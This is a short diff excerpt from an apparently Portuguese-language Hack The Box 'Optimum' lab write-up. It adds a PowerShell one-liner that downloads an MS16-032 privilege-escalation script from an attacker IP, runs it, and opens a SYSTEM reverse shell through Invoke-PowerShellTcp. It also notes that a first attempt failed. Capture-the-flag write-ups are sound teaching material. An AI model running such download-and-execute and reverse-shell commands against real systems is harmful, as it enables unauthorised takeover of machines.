@@ -1425,3 +1425,9 @@ p://10.10.15.169:3001/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -
 ```
 
 Seguindo essas intrucoes do codigo, vamos tentar obter nossa reverse shell de SYSTEM
+
+Primeira tentativa sem exito.. :/
+
+`IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.36:3001/ms16_032_intrd_mod.ps1');Invoke-MS16-032 "-NoProfile -ExecutionPolicy Bypass -Command IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.36:3001/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.36 -Port 3003"     `
+
+![9.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-optimum/9.jpg)
